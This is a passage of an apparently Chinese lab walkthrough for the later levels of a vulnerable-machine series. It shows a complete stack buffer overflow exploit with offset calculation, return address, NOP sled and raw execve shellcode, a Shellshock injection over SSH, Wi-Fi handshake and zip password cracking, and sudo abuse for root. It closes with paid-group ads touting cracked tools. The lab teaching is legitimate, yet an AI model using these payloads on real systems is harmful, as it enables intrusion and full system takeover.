![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuubEUBmtGboEJ4OHuk4wibSVOh5B7ibL3f4AibM9G6myxhVaKibUEyHO1Qg/640?wx_fmt=png&from=appmsg "")  
  
image-20241227032939965  
  
这里我们要用到msf自带的插件了，生成1024个字符（也可以不是1024，500，100都可以），用于测试程序是否存在缓冲区溢出漏洞  
```
cd /usr/share/metasploit-framework/tools/exploit
./pattern_create.rb -l 1024

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuEvZEezBI6eA8O613qCCiaQS84GXTRU6UBhdX1dBon5tDMeE0LeHKpCA/640?wx_fmt=png&from=appmsg "")  
  
image-20241227181733132  
  
在gdb中执行r00t文件，我们可以看到缓冲区溢出在 0x6a413969 这个位置  
```
run 你生成的1024个字符

```  
> 白小羽  
> Program received signal SIGSEGV, Segmentation fault.
程序接收到SIGSEGV信号，出现了分段故障，存在漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuImmdpZ9nQwNRb2OXagyIYSk8eIHL80qmyqnazL8QG7EoUVfKco7ejA/640?wx_fmt=png&from=appmsg "")  
  
image-20241227181935878  
  
使用msf的pattern_offset.rb反查 6a413969 对应上面的字符中的偏移量，为268  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuGPBA4Z6ClWY49yhl5GYuqsYT2icoBYzjyEk7QCnF8bOcLOlGibxy9jMg/640?wx_fmt=png&from=appmsg "")  
  
image-20241227182245154  
  
查找ESP栈的溢出地址，有了偏移量，就可以知道栈空间大小占据空间位置，接下来就要找跳板地址ESP，就可以跳到恶意代码shellcode的位置  
> 白小羽  
> 跳板地址：攻击者会在溢出数据后添加返回地址（即跳板地址），希望程序在执行到这条返回指令时能跳转到覆盖的恶意代码位置，从而执行攻击者的代码。  
  
  
print 写入 268 个A和4个B  
  
问：为什么是 4 个 B 而不是 2 个或 6 个？  
> 白小羽  
> 因为返回地址在 x86 上通常是 4 字节，使用 4 个字符（B）正好填满这一字节，每个 B 对应一个字节。  
> 如果只使用 2 个 B（即 2 字节），返回地址将没有被完全覆盖。  
> 而使用6个，会多于所需的字节数，但仍会覆盖返回地址。不过，这样的做法没有必要，因为多余的 B 不会提供任何额外的好处，只是冗余。  
  
```
r $(python -c 'print "A"*268 + "B"*4')   # 在GDB调试工具中 r表示启动调试当前程序
info r # 分析程序调试过程中的状态，在检查程序崩溃、调试函数调用及访问变量时，经常使用，前面已经有一个错误Program received signal SIGSEGV, Segmentation fault.，所以可以直接使用info r查看寄存器状态

```  
  
起始的 esp 内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu1vPyYzmrDBxOWQpnArxsRibFy0BZNeJQ5RAURlIbNeVMWDI04iaazXJg/640?wx_fmt=png&from=appmsg "")  
  
image-20241227183508292  
  
在生成的字符后面再添加几个字符，执行以后看一下缓冲区溢出的 esp 内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcumJUZsqJQiax55eJ3lToUKN4EpMsyA1GQ7sLibpjLPFb30UoZNiapb0cvg/640?wx_fmt=png&from=appmsg "")  
  
image-20241227185200696  
  
返回了一个新的地址  
  
结论：我们要构造268个字符偏移量，将esp位置放在268个字符之后，这样esp位置就存在了返回的栈里，并在esp字符之后加入shellcode，这样完成了对缓冲区溢出的利用。  
  
python代码将 0xbffffb80 起始的esp地址转化为**十六进制字节序列的形式**  
```
address = 0xbffffb80
byte_sequence = address.to_bytes(4, byteorder='little')
hex_representation = ''.join(f'\\x{byte:02x}' for byte in byte_sequence)
print(hex_representation) # \x80\xfb\xff\xbf

```  
  
查看内核信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccug5YmaFjRTPibPlPbD9d2hP8w7IQbgFJqMqicfVLXiaicG5cfkYkiaRosXkA/640?wx_fmt=png&from=appmsg "")  
  
image-20241227212112388  
  
x86系统  
  
如果输出是 x86_64，则表示你在使用 64 位系统（x64）。  
  
如果输出是 i686 或 i386，则表示你在使用 32 位系统（x86）。  
  
**Shell-Storm** 搜索关键字**获取shellcode**，x86 - execve  
```
https://shell-storm.org/shellcode/index.html

```  
> 白小羽  
> execve：表示可执行文件的意思  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuFmFd0lnEG0HhIkHCXwEPIJIHO6efia8kCbzVQBlS7ibjdaeibdmdl6tSQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241227212748996  
  
然后我们需要的是shellcode，所以关键字就是，execve、x86、shellcode，就能定位到这个，中间的哪个表示需要执行的命令也就是获取一个shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu5Jqazwyt3g8jORzPicCvrBrmlkRbQotmYMToBybAZAeJU9iav8jyGUYg/640?wx_fmt=png&from=appmsg "")  
  
image-20241227213244966  
  
这下就能组成一个payload了  
```
./r00t $(python -c 'print "A"*偏移量 + "esp起始地址" + "nop sled"*20 + "shellcode"')

./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

```  
> 白小羽  
> nop sled
是一种可以破解栈随机化的缓冲区溢出攻击方式  
> 栈随机化指运行时栈的起始地址为随机的，所以我们存放shellcode的esp的地址也会发生对应的改变  
> 在shellcode前注入很长的 nop（\x90） 指令 （无操作，仅使程序计数器加一）序列，  
> 程序计数器逐步加一，直到到达攻击代码的存在的地址  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu9ftxT6T15zO8Vn0y57hzrTkiaWl29jOyTtAOBlZfOV14pMwX9KNXc2A/640?wx_fmt=png&from=appmsg "")  
  
image-20241227213747063  
  
提权成功  
  
另外这个esp起始地址一定是要固定不变的吗？  
  
我们把他修改为返回后的esp地址也就是0xbffffb50，之前是0xbffffb80，上python代码（这个脚本可以保存好，经常要用）  
```
address = 0xbffffb80
byte_sequence = address.to_bytes(4, byteorder='little')
hex_representation = ''.join(f'\\x{byte:02x}' for byte in byte_sequence)
print(hex_representation) # \x50\xfb\xff\xbf

```  
  
而我修改了这个nop sled数量为400个，照样也是可以提权的  
```
./r00t $(python -c 'print "A"*偏移量 + "esp其他地址" + "nop sled"*400 + "shellcode"')
./r00t $(python -c 'print "A"*268 + "\x50\xfb\xff\xbf" + "\x90"*400 + "\xba\x19\xb3\xb8\x79\xdb\xde\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x55\x15\x83\xed\xfc\x03\x55\x11\xe2\xec\xd9\xb3\x21\x97\x4c\xa2\xb9\x8a\x13\xa3\xdd\xbc\xfc\xc0\x49\x3c\x6b\x08\xe8\x55\x05\xdf\x0f\xf7\x31\xd7\xcf\xf7\xc1\xc7\xad\x9e\xaf\x38\x41\x08\x30\x10\xf6\x41\xd1\x53\x78"')

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuWDHBR3j3MHvLmZOmJPkIyZz5D62GiaVAgl6QDOuBvabjuT0n51XaL6Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241227224933703  
  
这个案例就证明只要nop sled枚举的地址足够多，成功几率还是很大的，接下来是level 3  
## level 3  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuX6SGEWamaXLQo0alLVFribQd97bkHqsQUlibkxTFVPO2ibSoOF9C93ZPg/640?wx_fmt=png&from=appmsg "")  
  
image-20241228193929123  
  
主机发现，直接连接就行了，start:here  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccug5Jes170mND1VA04JJ9ibVx8ghCNVDibX2JpCqWY2wGFZ8LCOaic0waAQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241228194825173  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuBjIz3uqHh3rA88ImHicibiab5kvtg3F61D5YI5H9x9xV894cXSdtRbxPA/640?wx_fmt=png&from=appmsg "")  
  
image-20241228194844200  
  
suid  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu5Tic4rib0YEjg9RkIgcPMYSnOuOaWIDnMiaXRVYh67XHqUxptakpY2Aew/640?wx_fmt=png&from=appmsg "")  
  
image-20241228194938106  
  
常规信息收集  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuXygAZjWgPcRb2h93zrEe9jPQynjSVbyHgtPgVvVsfQuNvGMEGfOcbQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241228200129662  
  
sudo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuSzxpmYXSAEESStTOibsMV0ib4aLMvaK7gZibxTLiadUj8LDZyS4YEc0epg/640?wx_fmt=png&from=appmsg "")  
  
image-20241228200414866  
  
0777文件：表示一个文件或目录完全开放，任何用户都可以读取、修改和执行它。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcunD8flKdCDCuN7ia1VqKYFtKfSUtesdNWBnQFkLkuB82c1ppMTUQjOQw/640?wx_fmt=png&from=appmsg "")  
  
image-20241228201541211  
  
这里有一个cap文件（可以用wireshark工具打开），这不是常规的数据包，802.11跟无线协议的关系很大  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcufxfiayaG7Wd5ShpFLGicddIJCVpaG5lYQvtjc5cGBZfiamJ2ern7cKgYw/640?wx_fmt=png&from=appmsg "")  
  
image-20241228202422251  
  
这像是一个字典  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuksH4fKzLln7J66FSzUxlEHAiaDMy57pynIQt8E78tr0A4aw2p5vCc8A/640?wx_fmt=png&from=appmsg "")  
  
image-20241228203440930  
  
把他用上  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuenuQcEMX6T1HbZFeNgDaZqSsddaRNIBKzhgY3OsqqM9ZdWM5LkwK8A/640?wx_fmt=png&from=appmsg "")  
  
image-20241228203407019  
  
aircrack-ng，爆破密码试试  
> 白小羽  
> Tips：有Wi-Fi网络的握手数据包可以在离线情况下进行密码破解，无需与你的设备直接连接该网络。  
  
```
aircrack-ng -w gold_star.txt wytshadow.cap

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccuo3GibtdbjgPkoicZ0GQ6KSKiaZBib1eC5icHhibu71jDDRN5ZicArjqMkmia1w/640?wx_fmt=png&from=appmsg "")  
  
image-20241228203807122  
  
有了文件名称和密码gaUoCe34t1，去看看有没有这个用户wytshadow  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu2DVg3KBBk4POsj6KJVpM1aNPCibIyAbXDWk68iciadn180X0yC83CaEWg/640?wx_fmt=png&from=appmsg "")  
  
image-20241228204118325  
  
密码正确  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu7ia95sCVR7E1J97uZkqmCr5f3Vc7Dv8PsmZocXsVniazrOhqov4rchicg/640?wx_fmt=png&from=appmsg "")  
  
image-20241228204222875  
  
继续信息收集，可以看到有一个nginx的服务文件可以用  
```
sudo -l

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuibEJ3K6rE7NMPWgR9MIB1J54ibwE1ibCicIcuqIjUdLadq0WTfHGNlyibqg/640?wx_fmt=png&from=appmsg "")  
  
image-20250102184333334  
  
启动这个nginx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcufOfKKVibT7icWxILxCBfGFElQu6Iq7LB186Z2yne0AlWYqfAgByDSTZQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250102184859724  
  
查看默认的配置信息，监听的是8080端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuTNsNJ2icIZLcDdYKjkqE7DadxJrKGGJ9tBFlbMGZwxNP3je7I2146hQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250102230432634  
  
查看端口信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuY4uPUc45R9sejKdiaicspn4HzmfDsYj9NZ3lxpy79qRubTmCsZbGiavPg/640?wx_fmt=png&from=appmsg "")  
  
image-20250102230546085  
  
curl用不了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuLG6bUzwwWmpSCwukmnDicSe9g41ibpMCgAXPTyuibxjTJfKibyEicrrUuWA/640?wx_fmt=png&from=appmsg "")  
  
image-20250102225118614  
  
那么就用本机访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu3gqGKR04UtBX7N9GmzZA8McG8R9bw6iabNNOQ3tI6nIFchpUh7j1gDw/640?wx_fmt=png&from=appmsg "")  
  
image-20250102225201569  
  
这里要用到一个工具，lynx，默认kali是没有的  
> 白小羽  
> lynx：是一个文本模式的网页浏览器  
  
```
sudo apt-get install lynx

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuSVnI4V0qZExboLjdSe6p9ickT7Q9aicLvydBffxiaoPl6TbVOwtsYmUiaw/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014048458  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuIywe3ibXK8sQsEfg87a9YEpy0yZYal0n0Sw3XXdicibC0M6g95DiaM5Fwg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014056957  
  
此时我们就得到了一组数据genphlux:HF9nd0cR!，那么久查看一下是否有这个用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcutJ6UoewsXwVjr6LAjeLbN4NFJHmicjnm0h2FfWc9VoVmPIOaljdZhGg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014157128  
  
之前那个是nginx，现在是apache文件了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu8mGLrP57DTjiabvAEjTWCneTkiaXs6VpK2cFHVc0icLbwKO0woAKxhhDw/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014304793  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuKeLuNYYOwawiaSg5ib9LuCBgjd48C1IH8doesmAC06ibWZWJdVOrj5ecA/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014443011  
  
查看默认开启的端口（apache的启动端口）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuCftBic9FxYytVUeUicFnIKicUY1EM9kTXXIJ98HWibiaX56oG6PudrCUGPw/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014514182  
  
查看是否启动成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuP7CqVJXw5rbGz4ib208coFSy2hYj4PfWUwVHKsDch0wny30p8rtS7sw/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014607134  
  
80开启成功了，但是没有任何信息，只有一个403  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuDnApIKc5AjblGGgcPLZm6GurZzvNY5YvFp4dabZnGviaoZxY6tiaUcmA/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014715162  
  
此时可以返回去看配置文件，有一个allow from 127.0.0.1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuQVjxTatExK5LLQERZ8G2SddkTECc8ibGKYJH2uD7GDTXFoMXPWGvcrQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250103014854125  
  
查看是否存在curl和wget，来访问本地的服务（127.0.0.1）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcutRscngvU6hl6zGSjkKDaUhxZon3iaVib2vNIYiaVN4BJreQyXnQB8Yhqg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103015203002  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuSUibKDyjqv3ibHqPoUwfnTb1JZVM9riaSKGYduyMOK7uJl9ISpFuACr5Q/640?wx_fmt=png&from=appmsg "")  
  
image-20250103015147563  
  
fido:x4tPl!，但是呢鉴权失败了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuWpcvcog82Ux1oaEuy8XHJ1Ees8qjse7VN8WmN5sIa1QXTzGfLTjiaNg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103015425260  
  
回家的路上，看到了两个文件，一个ssh私匙  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuicnPoycKwON6Pic0YLCruRicMafIycOlPHA7m4cRmkpOWFaYLQpfrlYyg/640?wx_fmt=png&from=appmsg "")  
  
这里搜集了半天，找到一个viminfo中有一个密码信息 B^slc8I$  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuPjvJ3Rbmkw9y7V1WQiceRe2gAyydeW3nDibcJdiao8WEibhPth390hA4xQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250103020656619  
  
尝试sudo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccunq2PO8y8v8sfI1k8ZicDCq2QibEotbmFqF7Oqm9ZMpkDWYZoa5s6vI8A/640?wx_fmt=png&from=appmsg "")  
  
image-20250103020748431  
  
sudo成功了，再看看权限，可以读写！还可以sudo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcukQs2ZlXI1yBvbs2GawcvibCCaiaib2RJAURoNSgoBcv2gqpkmVHoehHAg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103020939359  
  
写一个c文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuAG8liaGJI9WNIkteHnShfOfIGoeIBDicQcgdU5nOibYkDNWqT8ibN9xO5w/640?wx_fmt=png&from=appmsg "")  
  
image-20250103021250968  
  
这里出现一个编译错误，说我们使用了一个隐式的函数system，需要我们加上一个参数  
```
gcc -o dont_even_bother test.c -Wno-implicit-function-declaration

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuzswFxE0mdLcomJF7uW0MYv6pbYHES4N2qfo4zvudKJ0K1CE1yWlY2g/640?wx_fmt=png&from=appmsg "")  
  
image-20250103021324986  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuRrF0umKFxFKwgexj1UT1qPlS7jR3icia5mnlrib48qwDhfeicNFq4RUAQA/640?wx_fmt=png&from=appmsg "")  
  
image-20250103021450072  
## 总结  
  
level 1主要使用的是ftp匿名登录，和低版本操作系统的内核提权  
  
level 2 通过页面上的图片信息，使用strings查看图片信息，有一个信息泄露，得到zip密码信息后，使用fcrackzip对压缩包文件进行一个暴力破解，命令如下  
```
fcrackzip -D -p pass.txt -u lmao.zip

```  
  
然后就是Bashdoor（bash之门漏洞），命令如下  
```
ssh -i noob -o "PubkeyAcceptedKeyTypes=ssh-rsa" noob@192.168.111.191 -t "() { :;}; /bin/bash"

```  
  
最后就是缓冲区溢出漏洞，如何判断？看函数信息就可以了，需要一个调试工具gdb，还有msf的一个接口，常用命令  
```
gdb filename # 进入该文件的调试
disas main # 显示main函数的汇编代码
run # 运行当前文件，可简写 r 
# msf接口
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024 # 表示生成1024个字符
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [缓冲区溢出的位置，例如(0x6a413969)] -l 1024 # 反查这个溢出的位置的偏移量

```  
  
一个有用的python脚本，将 0xbffffb80 起始的esp地址转化为**十六进制字节序列的形式**  
```
address = 0xbffffb80
byte_sequence = address.to_bytes(4, byteorder='little')
hex_representation = ''.join(f'\\x{byte:02x}' for byte in byte_sequence)
print(hex_representation) # \x80\xfb\xff\xbf

```  
  
一个有用的shellcode获取地  
```
https://shell-storm.org/shellcode/index.html

```  
  
level 3 首先就是内网的信息收集，sudo开启nginx，然后使用lynx工具，获取网页信息，得到下一个用户的信息，第二个信息是apache的80端口，但是同样的方法，不会让你用第二次，切换到当前用户根目录，获取到ssh密匙文件，ssh登录即可，登录之后，信息收集需要完善，从viminfo找到密码信息，这个时候就能sudo了，利用可以sudo的文件权限信息，进行提权即可，感谢观看！  
## 广告时间  
  
如果你喜欢水报告，这里有1000多份的src报告，供你学习思路  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuxmibB68A3VmUdTGyQXPlYAkatfzPv41llY8DcjrmUYTOw52VVibB7Bgg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103034632951  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu9Fcqzh1TGMmuic3sT0l2u75uicET5teibH8tC9eEgoMElasibSgJMMianZA/640?wx_fmt=png&from=appmsg "")  
  
image-20250103033521757  
  
如果你想要一些源码，这里将有上百套的源码，供你魔改开发属于你自己的软件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuhEzsRTvydnBgLiaLQIRcAGxjYjMPXcLqiaB9Th0hTSqPVxIwib7Fjqg3g/640?wx_fmt=png&from=appmsg "")  
  
image-20250103032449395  
  
如果你需要ppt，那么这里几千份ppt模板，供你选择，搭配上GPT，轻松搞定你的每月汇总  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuFC8mCPRBspGE7UNI4wicubFFSgESw9touPZ3twbaZgFgXiayOek9d2Ow/640?wx_fmt=png&from=appmsg "")  
  
image-20250103033627509  
  
如果你想要做副业，那么这里有几百个网赚项目，让你利用流量变现，每个月可以多几条烟钱（我不抽烟），每年也可以小赚1w+  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu0iajKPJWvtFl86MHWB4swpAjzMDko95CNnOSlRESibfptwDYTam1q7bg/640?wx_fmt=png&from=appmsg "")  
  
image-20250103033727755  
  
如果你想要各种破解工具，辱羊毛，不想开会员，那么这里是你最好的选择，还有很多的实用小工具  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuZ7QwJuQrFt4RR9NZT5reI8Hibq8OuHPYoQibZQpTwmWxyQGLfS1tDcAA/640?wx_fmt=png&from=appmsg "")  
  
image-20250103034202772  
  
还有各种的学习资料，包括且不限于渗透测试，python/c++编程，免杀，AI人工智障，逆向，安全开发等互联网资源（如果进了帮会需要百度网盘还请联系我）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuD51k5nOqPhewpd3ibthFWjGgrMHFyfRyX5SiajBNqdWMI4M7WZCJ0pGQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250103035215880  
  
如果你想要兼职，那么泷羽Sec提供了一个很好的兼职机会，您邀请一个人进入泷羽Sec帮会，凡是进入本帮会，嘉宾享72%的帮会推广收益，也就是【一次性付费金额x0.72】，普通成员享受推广收益的40%也就是【一次性付费金额x0.40】  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4Ccu75z8bRJ87mOPtRic3YOKDf1PzjfJUiaibHOeF9HmzemQgIjjkdLM7JGDA/640?wx_fmt=png&from=appmsg "")  
  
image-20250103035933917  
  
泷羽Sec资料库，现一次性付费99，即可永久进入，加入泷羽Sec帮会，享受各种IT资源  
  
资源持续更新中...  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH1IO3ibjQXrYxicpAbsy4CcuTNNbZtEXkYrzVAFrFoicXpFGrSkMQwBk7UXkQZQFPJqiagXrntCxAC6A/640?wx_fmt=png&from=appmsg "")  
  
帮会推广  
  
感谢支持！  
#### 往期推荐  
  
[30款burp插件，一键搞定99%的渗透工具！](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247496242&idx=1&sn=86eec42ed49322e4e8d81929bb64e982&scene=21#wechat_redirect)  
  
  
[HTB-Chemistry靶机渗透教程](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247496165&idx=1&sn=5a16f7bc8dc1280d8636752d8dc817af&scene=21#wechat_redirect)  
  
  
[【渗透测试】linux隐身登录](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247493342&idx=1&sn=9f85cbff7def1b322ddd111acb4b8853&scene=21#wechat_redirect)  
  
  
[【渗透测试】DC1~9(全) Linux提权靶机渗透教程，干货w字解析，建议收藏](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247495774&idx=1&sn=ad20212bd08f94652d40e286406ed40f&scene=21#wechat_redirect)  
  
  
[2024Goby红队版工具分享，附2024年漏洞POC下载](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247496017&idx=1&sn=08cf04adb3988032154a34846fd897b5&scene=21#wechat_redirect)  
  
  
  
